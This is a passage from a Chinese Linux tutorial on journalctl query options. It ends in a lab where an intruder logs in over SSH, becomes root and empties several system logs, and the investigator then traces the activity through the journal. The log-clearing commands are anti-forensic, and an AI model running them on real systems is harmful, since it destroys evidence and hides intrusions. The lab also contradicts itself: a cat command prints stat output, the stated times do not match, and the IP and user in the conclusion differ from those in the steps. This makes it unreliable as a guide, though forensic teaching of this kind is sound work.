> 在 -h 中查看更多

```
[root@xuegod63 ~]# journalctl -o short-precise
```

> 输出的时间更加精细，日志信息简洁

输出详细信息

```
[root@xuegod63 ~]# journalctl -o verbose
```

> 可信字段是指名称以下划线开头的字段。 这些字段由日志守护进程添加，客户端无法掌控这些字段的内容， 因此是"可信的"。详细信息中的字段都可以作为查询条件使用。

通过可信字段查询指定用户的日志

```
[root@xuegod63 ~]# journalctl _UID=0 -n 5
```

> 可信字段必须带有下划线

## 5 实战清理系统日志后使用 systemd-journald 分析日志

在 kali 通过普通用户登录 centos

```
┌──(root㉿kali-31)-[~]
└─# ssh centos@192.168.1.76
```

切换到 root 用户

```
[centos@CentOS-76 ~]$ su - root
```

直接清空日志

```
[root@CentOS-76 ~]# echo > /var/log/secure

[root@CentOS-76 ~]# echo > /var/log/messages

[root@CentOS-76 ~]# echo > /var/log/lastlog

[root@CentOS-76 ~]# echo > /var/log/wtmp

[root@CentOS-76 ~]# echo > /var/log/btmp
```

登录系统进行排查

```
[root@CentOS-76 ~]# last
```

```
[root@CentOS-76 ~]# lastlog
```

> 没有任何记录

查看日志文件修改时间

```
[root@CentOS-76 ~]# cat /var/log/secure
```

```
文件："/var/log/secure"
大小：793           块：8          IO 块：4096   普通文件
设备：fd00h/64768d    Inode：202555916   硬链接：1
权限：(0600/-rw-------)  Uid：(    0/    root)   Gid：(    0/    root)
最近访问：2023-05-15 09:58:48.620842753 +0800
最近更改：2023-08-02 15:38:44.055787811 +0800
最近改动：2023-08-02 15:38:44.055787811 +0800
创建时间：-
```

> 得知文件是 15:38 被修改
> 
> 查询 15:38 前所有日志，避免误差，加一分钟 17:49，实战中前后信息都要看。查看文件时间只能确认这个时间内这个文件被修改了，并不是绝对时间。

查看 journal 记录

> 要配置保存命令才行

```
[root@CentOS-76 log]# journalctl --until "2023-08-02 15:39:00" -o short-precise -r
```

```
8月 02 16:45:25 CentOS-76 root[5257]: root [5054]:stat /var/log/secure [0]
8月 02 16:45:10 CentOS-76 root[5248]: root [5054]:journalctl --until "2023-08-02 16:41:00" -r [141]
8月 02 16:45:05 CentOS-76 root[5237]: root [5168]:echo > /var/log/secure [0]
```

> 可以看到黑客通在 192.168.1.53 通过 ssh 服务登录 xuegod 用户，su - root 切换到 root 用户清空了日志。
